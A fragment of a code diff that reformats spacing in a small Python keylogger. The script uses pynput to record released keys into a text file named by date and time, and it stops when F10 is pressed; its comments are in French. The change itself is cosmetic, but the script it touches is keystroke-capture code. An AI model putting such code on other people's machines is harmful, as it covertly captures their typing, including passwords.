@@ -2,7 +2,7 @@ from pynput import keyboard
 import datetime
 
 namefile = datetime.datetime.now().strftime("%I %M%p on %B %d %Y") + ".txt"
-f = open(namefile,"w+")
+f = open(namefile, "w+")
 #crée un nouveau fichier texte intitulé date+heure.txt
 f.close()
 
@@ -30,7 +30,7 @@ def list(k):
 def on_release(key):
     list('{0}'.format(key))
     if key == keyboard.Key.f10:
-        return False #stop le script
+        return False  # stop le script
 
 with keyboard.Listener(on_release=on_release) as listener:
     listener.join()
